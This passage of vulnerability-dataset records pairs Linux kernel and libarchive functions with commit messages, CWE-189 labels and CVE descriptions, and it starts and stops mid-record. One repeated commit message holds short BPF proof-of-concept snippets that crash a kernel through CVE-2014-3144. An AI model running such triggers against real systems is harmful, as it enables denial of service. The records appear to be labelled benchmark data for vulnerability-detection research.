csum_fold(csum);\n\t\tskb->ip_summed = CHECKSUM_NONE;\n \n \t\t/* Check if there is enough headroom to insert fragment header. */\n \t\ttnl_hlen = skb_tnl_header_len(skb);\n\t\tif (skb->mac_header < (tnl_hlen + frag_hdr_sz)) {\n \t\t\tif (gso_pskb_expand_head(skb, tnl_hlen + frag_hdr_sz))\n \t\t\t\tgoto out;\n \t\t}\n\n\t\t/* Find the unfragmentable header and shift it left by frag_hdr_sz\n\t\t * bytes to insert fragment header.\n\t\t */\n\t\tunfrag_ip6hlen = ip6_find_1stfragopt(skb, &prevhdr);\n\t\tnexthdr = *prevhdr;\n\t\t*prevhdr = NEXTHDR_FRAGMENT;\n\t\tunfrag_len = (skb_network_header(skb) - skb_mac_header(skb)) +\n\t\t\t     unfrag_ip6hlen + tnl_hlen;\n\t\tpacket_start = (u8 *) skb->head + SKB_GSO_CB(skb)->mac_offset;\n\t\tmemmove(packet_start-frag_hdr_sz, packet_start, unfrag_len);\n\n\t\tSKB_GSO_CB(skb)->mac_offset -= frag_hdr_sz;\n\t\tskb->mac_header -= frag_hdr_sz;\n\t\tskb->network_header -= frag_hdr_sz;\n\n\t\tfptr = (struct frag_hdr *)(skb_network_header(skb) + unfrag_ip6hlen);\n\t\tfptr->nexthdr = nexthdr;\n\t\tfptr->reserved = 0;\n\t\tipv6_select_ident(fptr, (struct rt6_info *)skb_dst(skb));\n\n\t\t/* Fragment the skb. ipv6 header and the remaining fields of the\n\t\t * fragment header are updated in ipv6_gso_segment()\n\t\t */\n\t\tsegs = skb_segment(skb, features);\n\t}\n\nout:\n\treturn segs;\n}\n", "func_hash": 153608604574028516941374555274737447771, "file_name": "udp_offload.c", "file_hash": 211155262577847335361922507544905009994, "cwe": ["CWE-189"], "cve": "CVE-2013-4563", "cve_desc": "The udp6_ufo_fragment function in net/ipv6/udp_offload.c in the Linux kernel through 3.12, when UDP Fragmentation Offload (UFO) is enabled, does not properly perform a certain size comparison before inserting a fragment header, which allows remote attackers to cause a denial of service (panic) via a large IPv6 UDP packet, as demonstrated by use of the Token Bucket Filter (TBF) queueing discipline.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4563"}
{"idx": 158781, "project": "linux", "commit_id": "6062a8dc0517bce23e3c2f7d2fea5e22411269a3", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/6062a8dc0517bce23e3c2f7d2fea5e22411269a3", "commit_message": "ipc,sem: fine grained locking for semtimedop\n\nIntroduce finer grained locking for semtimedop, to handle the common case\nof a program wanting to manipulate one semaphore from an array with\nmultiple semaphores.\n\nIf the call is a semop manipulating just one semaphore in an array with\nmultiple semaphores, only take the lock for that semaphore itself.\n\nIf the call needs to manipulate multiple semaphores, or another caller is\nin a transaction that manipulates multiple semaphores, the sem_array lock\nis taken, as well as all the locks for the individual semaphores.\n\nOn a 24 CPU system, performance numbers with the semop-multi\ntest with N threads and N semaphores, look like this:\n\n\tvanilla\t\tDavidlohr's\tDavidlohr's +\tDavidlohr's +\nthreads\t\t\tpatches\t\trwlock patches\tv3 patches\n10\t610652\t\t726325\t\t1783589\t\t2142206\n20\t341570\t\t365699\t\t1520453\t\t1977878\n30\t288102\t\t307037\t\t1498167\t\t2037995\n40\t290714\t\t305955\t\t1612665\t\t2256484\n50\t288620\t\t312890\t\t1733453\t\t2650292\n60\t289987\t\t306043\t\t1649360\t\t2388008\n70\t291298\t\t306347\t\t1723167\t\t2717486\n80\t290948\t\t305662\t\t1729545\t\t2763582\n90\t290996\t\t306680\t\t1736021\t\t2757524\n100\t292243\t\t306700\t\t1773700\t\t3059159\n\n[davidlohr.bueso@hp.com: do not call sem_lock when bogus sma]\n[davidlohr.bueso@hp.com: make refcounter atomic]\nSigned-off-by: Rik van Riel <riel@redhat.com>\nSuggested-by: Linus Torvalds <torvalds@linux-foundation.org>\nAcked-by: Davidlohr Bueso <davidlohr.bueso@hp.com>\nCc: Chegu Vinod <chegu_vinod@hp.com>\nCc: Jason Low <jason.low2@hp.com>\nReviewed-by: Michel Lespinasse <walken@google.com>\nCc: Peter Hurley <peter@hurleysoftware.com>\nCc: Stanislav Kinsbursky <skinsbursky@parallels.com>\nTested-by: Emmanuel Benisty <benisty.e@gmail.com>\nTested-by: Sedat Dilek <sedat.dilek@gmail.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 0, "func": " void ipc_rcu_putref(void *ptr)\n {\n\tif (!atomic_dec_and_test(&container_of(ptr, struct ipc_rcu_hdr, data)->refcount))\n \t\treturn;\n \n \tif (container_of(ptr, struct ipc_rcu_hdr, data)->is_vmalloc) {\n\t\tcall_rcu(&container_of(ptr, struct ipc_rcu_grace, data)->rcu,\n\t\t\t\tipc_schedule_free);\n\t} else {\n\t\tkfree_rcu(container_of(ptr, struct ipc_rcu_grace, data), rcu);\n\t}\n}\n", "func_hash": 197603455992421624982661019707871459048, "file_name": "util.c", "file_hash": 44742915001977674062646830565038462250, "cwe": ["CWE-189"], "cve": "CVE-2013-4483", "cve_desc": "The ipc_rcu_putref function in ipc/util.c in the Linux kernel before 3.10 does not properly manage a reference count, which allows local users to cause a denial of service (memory consumption or system crash) via a crafted application.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4483"}
{"idx": 158802, "project": "linux", "commit_id": "1fc29bacedeabb278080e31bb9c1ecb49f143c3b", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/1fc29bacedeabb278080e31bb9c1ecb49f143c3b", "commit_message": "cifs: fix off-by-one bug in build_unc_path_to_root\n\ncommit 839db3d10a (cifs: fix up handling of prefixpath= option) changed\nthe code such that the vol->prepath no longer contained a leading\ndelimiter and then fixed up the places that accessed that field to\naccount for that change.\n\nOne spot in build_unc_path_to_root was missed however. When doing the\npointer addition on pos, that patch failed to account for the fact that\nwe had already incremented \"pos\" by one when adding the length of the\nprepath. This caused a buffer overrun by one byte.\n\nThis patch fixes the problem by correcting the handling of \"pos\".\n\nCc: <stable@vger.kernel.org> # v3.8+\nReported-by: Marcus Moeller <marcus.moeller@gmx.ch>\nReported-by: Ken Fallon <ken.fallon@gmail.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <sfrench@us.ibm.com>", "target": 0, "func": "build_unc_path_to_root(const struct smb_vol *vol,\n\t\tconst struct cifs_sb_info *cifs_sb)\n{\n\tchar *full_path, *pos;\n\tunsigned int pplen = vol->prepath ? strlen(vol->prepath) + 1 : 0;\n\tunsigned int unc_len = strnlen(vol->UNC, MAX_TREE_SIZE + 1);\n\n\tfull_path = kmalloc(unc_len + pplen + 1, GFP_KERNEL);\n\tif (full_path == NULL)\n\t\treturn ERR_PTR(-ENOMEM);\n\n\tstrncpy(full_path, vol->UNC, unc_len);\n \tpos = full_path + unc_len;\n \n \tif (pplen) {\n\t\t*pos = CIFS_DIR_SEP(cifs_sb);\n\t\tstrncpy(pos + 1, vol->prepath, pplen);\n \t\tpos += pplen;\n \t}\n \n\t*pos = '\\0'; /* add trailing null */\n\tconvert_delimiter(full_path, CIFS_DIR_SEP(cifs_sb));\n\tcifs_dbg(FYI, \"%s: full_path=%s\\n\", __func__, full_path);\n\treturn full_path;\n}\n", "func_hash": 314585337494192768360081406521262726411, "file_name": "connect.c", "file_hash": 88857981430770808203890685287516844319, "cwe": ["CWE-189"], "cve": "CVE-2013-4247", "cve_desc": "Off-by-one error in the build_unc_path_to_root function in fs/cifs/connect.c in the Linux kernel before 3.9.6 allows remote attackers to cause a denial of service (memory corruption and system crash) via a DFS share mount operation that triggers use of an unexpected DFS referral name length.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4247"}
{"idx": 158827, "project": "linux", "commit_id": "fc9bbca8f650e5f738af8806317c0a041a48ae4a", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/fc9bbca8f650e5f738af8806317c0a041a48ae4a", "commit_message": "vm: convert fb_mmap to vm_iomap_memory() helper\n\nThis is my example conversion of a few existing mmap users.  The\nfb_mmap() case is a good example because it is a bit more complicated\nthan some: fb_mmap() mmaps one of two different memory areas depending\non the page offset of the mmap (but happily there is never any mixing of\nthe two, so the helper function still works).\n\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 0, "func": "fb_mmap(struct file *file, struct vm_area_struct * vma)\n {\n \tstruct fb_info *info = file_fb_info(file);\n \tstruct fb_ops *fb;\n\tunsigned long mmio_pgoff;\n \tunsigned long start;\n \tu32 len;\n \n \tif (!info)\n \t\treturn -ENODEV;\n \tfb = info->fbops;\n \tif (!fb)\n \t\treturn -ENODEV;\n\tmutex_lock(&info->mm_lock);\n\tif (fb->fb_mmap) {\n\t\tint res;\n\t\tres = fb->fb_mmap(info, vma);\n\t\tmutex_unlock(&info->mm_lock);\n \t\treturn res;\n \t}\n \n\t/*\n\t * Ugh. This can be either the frame buffer mapping, or\n\t * if pgoff points past it, the mmio mapping.\n\t */\n \tstart = info->fix.smem_start;\n\tlen = info->fix.smem_len;\n\tmmio_pgoff = PAGE_ALIGN((start & ~PAGE_MASK) + len) >> PAGE_SHIFT;\n\tif (vma->vm_pgoff >= mmio_pgoff) {\n\t\tvma->vm_pgoff -= mmio_pgoff;\n \t\tstart = info->fix.mmio_start;\n\t\tlen = info->fix.mmio_len;\n \t}\n \tmutex_unlock(&info->mm_lock);\n\n \tvma->vm_page_prot = vm_get_page_prot(vma->vm_flags);\n\tfb_pgprotect(file, vma, start);\n\n\treturn vm_iomap_memory(vma, start, len);\n }\n", "func_hash": 280378351628973448196134758580254499320, "file_name": "fbmem.c", "file_hash": 332990640300605965736272929227510579328, "cwe": ["CWE-189"], "cve": "CVE-2013-2596", "cve_desc": "Integer overflow in the fb_mmap function in drivers/video/fbmem.c in the Linux kernel before 3.8.9, as used in a certain Motorola build of Android 4.1.2 and other products, allows local users to create a read-write memory mapping for the entirety of kernel memory, and consequently gain privileges, via crafted /dev/graphics/fb0 mmap2 system calls, as demonstrated by the Motochopper pwn program.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-2596"}
{"idx": 158907, "project": "libarchive", "commit_id": "22531545514043e04633e1c015c7540b9de9dbe4", "project_url": "https://github.com/libarchive/libarchive", "commit_url": "https://github.com/libarchive/libarchive/commit/22531545514043e04633e1c015c7540b9de9dbe4", "commit_message": "Limit write requests to at most INT_MAX.\nThis prevents a certain common programming error (passing -1 to write)\nfrom leading to other problems deeper in the library.", "target": 0, "func": " _archive_write_data(struct archive *_a, const void *buff, size_t s)\n {\n \tstruct archive_write *a = (struct archive_write *)_a;\n\tconst size_t max_write = INT_MAX;\n\n \tarchive_check_magic(&a->archive, ARCHIVE_WRITE_MAGIC,\n \t    ARCHIVE_STATE_DATA, \"archive_write_data\");\n\t/* In particular, this catches attempts to pass negative values. */\n\tif (s > max_write)\n\t\ts = max_write;\n \tarchive_clear_error(&a->archive);\n \treturn ((a->format_write_data)(a, buff, s));\n }\n", "func_hash": 280395881836362558906318660756506960450, "file_name": "archive_write.c", "file_hash": 173125723841928213196363231938589908387, "cwe": ["CWE-189"], "cve": "CVE-2013-0211", "cve_desc": "Integer signedness error in the archive_write_zip_data function in archive_write_set_format_zip.c in libarchive 3.1.2 and earlier, when running on 64-bit machines, allows context-dependent attackers to cause a denial of service (crash) via unspecified vectors, which triggers an improper conversion between unsigned and signed types, leading to a buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-0211"}
{"idx": 159037, "project": "linux", "commit_id": "05ab8f2647e4221cbdb3856dd7d32bd5407316b3", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/05ab8f2647e4221cbdb3856dd7d32bd5407316b3", "commit_message": "filter: prevent nla extensions to peek beyond the end of the message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check\nfor a minimal message length before testing the supplied offset to be\nwithin the bounds of the message. This allows the subtraction of the nla\nheader to underflow and therefore -- as the data type is unsigned --\nallowing far to big offset and length values for the search of the\nnetlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is\nalso wrong. It has the minuend and subtrahend mixed up, therefore\ncalculates a huge length value, allowing to overrun the end of the\nmessage while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to\na UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nla\n | ret\ta\n `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--\n | ; (needs a fake netlink header at offset 0)\n | ld\t#0\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\nFix the first issue by ensuring the message length fulfills the minimal\nsize constrains of a nla header. Fix the second bug by getting the math\nfor the remainder calculation right.\n\nFixes: 4738c1db15 (\"[SKFILTER]: Add SKF_ADF_NLATTR instruction\")\nFixes: d214c7537b (\"filter: add SKF_AD_NLATTR_NEST to look for nested..\")\nCc: Patrick McHardy <kaber@trash.net>\nCc: Pablo Neira Ayuso <pablo@netfilter.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "static u64 __skb_get_nlattr_nest(u64 ctx, u64 A, u64 X, u64 r4, u64 r5)\n{\n\tstruct sk_buff *skb = (struct sk_buff *)(long) ctx;\n\tstruct nlattr *nla;\n\n \tif (skb_is_nonlinear(skb))\n \t\treturn 0;\n \n\tif (skb->len < sizeof(struct nlattr))\n\t\treturn 0;\n\n \tif (A > skb->len - sizeof(struct nlattr))\n \t\treturn 0;\n \n \tnla = (struct nlattr *) &skb->data[A];\n\tif (nla->nla_len > skb->len - A)\n \t\treturn 0;\n \n \tnla = nla_find_nested(nla, X);\n\tif (nla)\n\t\treturn (void *) nla - (void *) skb->data;\n\n\treturn 0;\n}\n", "func_hash": 238463992730366810608006902490121668996, "file_name": "filter.c", "file_hash": 293672119478249626027402742238224315253, "cwe": ["CWE-189"], "cve": "CVE-2014-3144", "cve_desc": "The (1) BPF_S_ANC_NLATTR and (2) BPF_S_ANC_NLATTR_NEST extension implementations in the sk_run_filter function in net/core/filter.c in the Linux kernel through 3.14.3 do not check whether a certain length value is sufficiently large, which allows local users to cause a denial of service (integer underflow and system crash) via crafted BPF instructions.  NOTE: the affected code was moved to the __skb_get_nlattr and __skb_get_nlattr_nest functions before the vulnerability was announced.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3144"}
{"idx": 184406, "project": "linux", "commit_id": "05ab8f2647e4221cbdb3856dd7d32bd5407316b3", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/05ab8f2647e4221cbdb3856dd7d32bd5407316b3", "commit_message": "filter: prevent nla extensions to peek beyond the end of the message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check\nfor a minimal message length before testing the supplied offset to be\nwithin the bounds of the message. This allows the subtraction of the nla\nheader to underflow and therefore -- as the data type is unsigned --\nallowing far to big offset and length values for the search of the\nnetlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is\nalso wrong. It has the minuend and subtrahend mixed up, therefore\ncalculates a huge length value, allowing to overrun the end of the\nmessage while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to\na UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nla\n | ret\ta\n `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--\n | ; (needs a fake netlink header at offset 0)\n | ld\t#0\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\nFix the first issue by ensuring the message length fulfills the minimal\nsize constrains of a nla header. Fix the second bug by getting the math\nfor the remainder calculation right.\n\nFixes: 4738c1db15 (\"[SKFILTER]: Add SKF_ADF_NLATTR instruction\")\nFixes: d214c7537b (\"filter: add SKF_AD_NLATTR_NEST to look for nested..\")\nCc: Patrick McHardy <kaber@trash.net>\nCc: Pablo Neira Ayuso <pablo@netfilter.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "static u64 __skb_get_nlattr(u64 ctx, u64 A, u64 X, u64 r4, u64 r5)\n{\n\tstruct sk_buff *skb = (struct sk_buff *)(long) ctx;\n\tstruct nlattr *nla;\n\n \tif (skb_is_nonlinear(skb))\n \t\treturn 0;\n \n\tif (skb->len < sizeof(struct nlattr))\n\t\treturn 0;\n\n \tif (A > skb->len - sizeof(struct nlattr))\n \t\treturn 0;\n \n\tnla = nla_find((struct nlattr *) &skb->data[A], skb->len - A, X);\n\tif (nla)\n\t\treturn (void *) nla - (void *) skb->data;\n\n\treturn 0;\n}\n", "func_hash": 77719296777876183697115486684403189323, "file_name": "filter.c", "file_hash": 293672119478249626027402742238224315253, "cwe": ["CWE-189"], "cve": "CVE-2014-3144", "cve_desc": "The (1) BPF_S_ANC_NLATTR and (2) BPF_S_ANC_NLATTR_NEST extension implementations in the sk_run_filter function in net/core/filter.c in the Linux kernel through 3.14.3 do not check whether a certain length value is sufficiently large, which allows local users to cause a denial of service (integer underflow and system crash) via crafted BPF instructions.  NOTE: the affected code was moved to the __skb_get_nlattr and __skb_get_nlattr_nest functions before the vulnerability was announced.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3144"}
{"idx": 159040, "project": "linux", "commit_id": "a03ffcf873fe0f2565386ca8ef832144c42e67fa", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/a03ffcf873fe0f2565386ca8ef832144c42e67fa", "commit_message": "net: bpf_jit: fix an off-one bug in x86_64 cond jump target\n\nx86 jump instruction size is 2 or 5 bytes (near/long jump), not 2 or 6\nbytes.\n\nIn case a conditional jump is followed by a long jump, conditional jump\ntarget is one byte past the start of target instruction.\n\nSigned-off-by: Markus K\u00f6tter <nepenthesdev@gmail.com>\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "void bpf_jit_compile(struct sk_filter *fp)\n{\n\tu8 temp[64];\n\tu8 *prog;\n\tunsigned int proglen, oldproglen = 0;\n\tint ilen, i;\n\tint t_offset, f_offset;\n\tu8 t_op, f_op, seen = 0, pass;\n\tu8 *image = NULL;\n\tu8 *func;\n\tint pc_ret0 = -1; /* bpf index of first RET #0 instruction (if any) */\n\tunsigned int cleanup_addr; /* epilogue code offset */\n\tunsigned int *addrs;\n\tconst struct sock_filter *filter = fp->insns;\n\tint flen = fp->len;\n\n\tif (!bpf_jit_enable)\n\t\treturn;\n\n\taddrs = kmalloc(flen * sizeof(*addrs), GFP_KERNEL);\n\tif (addrs == NULL)\n\t\treturn;\n\n\t/* Before first pass, make a rough estimation of addrs[]\n\t * each bpf instruction is translated to less than 64 bytes\n\t */\n\tfor (proglen = 0, i = 0; i < flen; i++) {\n\t\tproglen += 64;\n\t\taddrs[i] = proglen;\n\t}\n\tcleanup_addr = proglen; /* epilogue address */\n\n\tfor (pass = 0; pass < 10; pass++) {\n\t\t/* no prologue/epilogue for trivial filters (RET something) */\n\t\tproglen = 0;\n\t\tprog = temp;\n\n\t\tif (seen) {\n\t\t\tEMIT4(0x55, 0x48, 0x89, 0xe5); /* push %rbp; mov %rsp,%rbp */\n\t\t\tEMIT4(0x48, 0x83, 0xec, 96);\t/* subq  $96,%rsp\t*/\n\t\t\t/* note : must save %rbx in case bpf_error is hit */\n\t\t\tif (seen & (SEEN_XREG | SEEN_DATAREF))\n\t\t\t\tEMIT4(0x48, 0x89, 0x5d, 0xf8); /* mov %rbx, -8(%rbp) */\n\t\t\tif (seen & SEEN_XREG)\n\t\t\t\tCLEAR_X(); /* make sure we dont leek kernel memory */\n\n\t\t\t/*\n\t\t\t * If this filter needs to access skb data,\n\t\t\t * loads r9 and r8 with :\n\t\t\t *  r9 = skb->len - skb->data_len\n\t\t\t *  r8 = skb->data\n\t\t\t */\n\t\t\tif (seen & SEEN_DATAREF) {\n\t\t\t\tif (offsetof(struct sk_buff, len) <= 127)\n\t\t\t\t\t/* mov    off8(%rdi),%r9d */\n\t\t\t\t\tEMIT4(0x44, 0x8b, 0x4f, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\t/* mov    off32(%rdi),%r9d */\n\t\t\t\t\tEMIT3(0x44, 0x8b, 0x8f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, data_len)))\n\t\t\t\t\t/* sub    off8(%rdi),%r9d */\n\t\t\t\t\tEMIT4(0x44, 0x2b, 0x4f, offsetof(struct sk_buff, data_len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT3(0x44, 0x2b, 0x8f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, data_len), 4);\n\t\t\t\t}\n\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, data)))\n\t\t\t\t\t/* mov off8(%rdi),%r8 */\n\t\t\t\t\tEMIT4(0x4c, 0x8b, 0x47, offsetof(struct sk_buff, data));\n\t\t\t\telse {\n\t\t\t\t\t/* mov off32(%rdi),%r8 */\n\t\t\t\t\tEMIT3(0x4c, 0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, data), 4);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tswitch (filter[0].code) {\n\t\tcase BPF_S_RET_K:\n\t\tcase BPF_S_LD_W_LEN:\n\t\tcase BPF_S_ANC_PROTOCOL:\n\t\tcase BPF_S_ANC_IFINDEX:\n\t\tcase BPF_S_ANC_MARK:\n\t\tcase BPF_S_ANC_RXHASH:\n\t\tcase BPF_S_ANC_CPU:\n\t\tcase BPF_S_ANC_QUEUE:\n\t\tcase BPF_S_LD_W_ABS:\n\t\tcase BPF_S_LD_H_ABS:\n\t\tcase BPF_S_LD_B_ABS:\n\t\t\t/* first instruction sets A register (or is RET 'constant') */\n\t\t\tbreak;\n\t\tdefault:\n\t\t\t/* make sure we dont leak kernel information to user */\n\t\t\tCLEAR_A(); /* A = 0 */\n\t\t}\n\n\t\tfor (i = 0; i < flen; i++) {\n\t\t\tunsigned int K = filter[i].k;\n\n\t\t\tswitch (filter[i].code) {\n\t\t\tcase BPF_S_ALU_ADD_X: /* A += X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x01, 0xd8);\t\t/* add %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_ADD_K: /* A += K; */\n\t\t\t\tif (!K)\n\t\t\t\t\tbreak;\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xc0, K);\t/* add imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x05, K);\t/* add imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_SUB_X: /* A -= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x29, 0xd8);\t\t/* sub    %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_SUB_K: /* A -= K */\n\t\t\t\tif (!K)\n\t\t\t\t\tbreak;\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xe8, K); /* sub imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x2d, K); /* sub imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_MUL_X: /* A *= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT3(0x0f, 0xaf, 0xc3);\t/* imul %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_MUL_K: /* A *= K */\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x6b, 0xc0, K); /* imul imm8,%eax,%eax */\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x69, 0xc0);\t\t/* imul imm32,%eax */\n\t\t\t\t\tEMIT(K, 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_DIV_X: /* A /= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x85, 0xdb);\t/* test %ebx,%ebx */\n\t\t\t\tif (pc_ret0 != -1)\n\t\t\t\t\tEMIT_COND_JMP(X86_JE, addrs[pc_ret0] - (addrs[i] - 4));\n\t\t\t\telse {\n\t\t\t\t\tEMIT_COND_JMP(X86_JNE, 2 + 5);\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t\tEMIT1_off32(0xe9, cleanup_addr - (addrs[i] - 4)); /* jmp .+off32 */\n\t\t\t\t}\n\t\t\t\tEMIT4(0x31, 0xd2, 0xf7, 0xf3); /* xor %edx,%edx; div %ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_DIV_K: /* A = reciprocal_divide(A, K); */\n\t\t\t\tEMIT3(0x48, 0x69, 0xc0); /* imul imm32,%rax,%rax */\n\t\t\t\tEMIT(K, 4);\n\t\t\t\tEMIT4(0x48, 0xc1, 0xe8, 0x20); /* shr $0x20,%rax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_AND_X:\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x21, 0xd8);\t\t/* and %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_AND_K:\n\t\t\t\tif (K >= 0xFFFFFF00) {\n\t\t\t\t\tEMIT2(0x24, K & 0xFF); /* and imm8,%al */\n\t\t\t\t} else if (K >= 0xFFFF0000) {\n\t\t\t\t\tEMIT2(0x66, 0x25);\t/* and imm16,%ax */\n\t\t\t\t\tEMIT2(K, 2);\n\t\t\t\t} else {\n\t\t\t\t\tEMIT1_off32(0x25, K);\t/* and imm32,%eax */\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_OR_X:\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x09, 0xd8);\t\t/* or %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_OR_K:\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xc8, K); /* or imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x0d, K);\t/* or imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_LSH_X: /* A <<= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT4(0x89, 0xd9, 0xd3, 0xe0);\t/* mov %ebx,%ecx; shl %cl,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_LSH_K:\n\t\t\t\tif (K == 0)\n\t\t\t\t\tbreak;\n\t\t\t\telse if (K == 1)\n\t\t\t\t\tEMIT2(0xd1, 0xe0); /* shl %eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT3(0xc1, 0xe0, K);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_RSH_X: /* A >>= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT4(0x89, 0xd9, 0xd3, 0xe8);\t/* mov %ebx,%ecx; shr %cl,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_RSH_K: /* A >>= K; */\n\t\t\t\tif (K == 0)\n\t\t\t\t\tbreak;\n\t\t\t\telse if (K == 1)\n\t\t\t\t\tEMIT2(0xd1, 0xe8); /* shr %eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT3(0xc1, 0xe8, K);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_NEG:\n\t\t\t\tEMIT2(0xf7, 0xd8);\t\t/* neg %eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_RET_K:\n\t\t\t\tif (!K) {\n\t\t\t\t\tif (pc_ret0 == -1)\n\t\t\t\t\t\tpc_ret0 = i;\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t} else {\n\t\t\t\t\tEMIT1_off32(0xb8, K);\t/* mov $imm32,%eax */\n\t\t\t\t}\n\t\t\t\t/* fallinto */\n\t\t\tcase BPF_S_RET_A:\n\t\t\t\tif (seen) {\n\t\t\t\t\tif (i != flen - 1) {\n\t\t\t\t\t\tEMIT_JMP(cleanup_addr - addrs[i]);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tif (seen & SEEN_XREG)\n\t\t\t\t\t\tEMIT4(0x48, 0x8b, 0x5d, 0xf8);  /* mov  -8(%rbp),%rbx */\n\t\t\t\t\tEMIT1(0xc9);\t\t/* leaveq */\n\t\t\t\t}\n\t\t\t\tEMIT1(0xc3);\t\t/* ret */\n\t\t\t\tbreak;\n\t\t\tcase 